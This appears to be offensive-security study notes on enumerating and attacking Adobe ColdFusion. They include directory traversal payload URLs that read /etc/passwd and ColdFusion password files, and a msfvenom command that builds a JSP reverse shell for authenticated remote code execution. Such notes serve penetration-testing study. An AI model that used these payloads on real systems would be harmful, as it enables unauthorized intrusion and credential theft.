## Enumeration 
#### banner grabbing 
```nmap
nmap -p- -sC -Pn 10.129.247.30 --open
```

#### common directories & extensions 
```bash
/CFIDE
/CFIDE/administrator
/cfdocs
application.cfm  # check for version info
```
![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/64408d8b-ddad-4381-af7d-584636a3bd46)

![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/2ed0c1e1-a314-4533-a54a-24ea0857eda2)


#### cold fusion markup langauge (CFML) 
```html
# cfquery
<cfquery name="myQuery" datasource="myDataSource">
  SELECT *
  FROM myTable
</cfquery>

# cfloop
<cfloop query="myQuery">
  <p>#myQuery.firstName# #myQuery.lastName#</p>
</cfloop>
```
#### Common ports 
```bash
80, 443, 1935, 25, 8500, 5500
```

#### known CVEs for ColdFusion 
```bash
CVE-2021-21087: Arbitrary disallow of uploading JSP source code
CVE-2020-24453: Active Directory integration misconfiguration
CVE-2020-24450: Command injection vulnerability
CVE-2020-24449: Arbitrary file reading vulnerability
CVE-2019-15909: Cross-Site Scripting (XSS) Vulnerability
```

<br> 
<br>

## Attacking ColdFusion 
#### CVE-2010-2861 - Directory Traversal 

The following code lists contents of the uploads directory which is not validated correctly 
```html
<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
<cfloop query="fileList">
    <a href="uploads/#fileList.name#">#fileList.name#</a><br>
</cfloop>
```
These ColdFusion files are vulnerable to a directory traversal attack in Adobe ColdFusion 9.0.1 and earlier versions.
```bash 
CFIDE/administrator/settings/mappings.cfm
logging/settings.cfm
datasources/index.cfm
j2eepackaging/editarchive.cfm
CFIDE/administrator/enter.cfm

Examples of directory traversal payloads
```bash 
http://example.com/index.cfm?directory=../../../etc/&file=passwd
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../../../lib/password.properties
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../../../../ColdFusion8/lib/password.properties
```
<br> 

#### Authenticated RCE 
If we can access the admin panel for ColdFusion 8 we can obtain RCE through the `Debugging & Logging -> Add/Edit scheduled task` functionality. 

```bash
sudo msfvenom -p java/java_shell_reverse_tcp LHOST= LPORT=443 -f raw -o shell.jsp
```

![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/f249e5b1-f444-4e79-a406-eceeae6b31c5)

![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/b0d0673b-5487-48f1-a8a6-98bf3de01660)


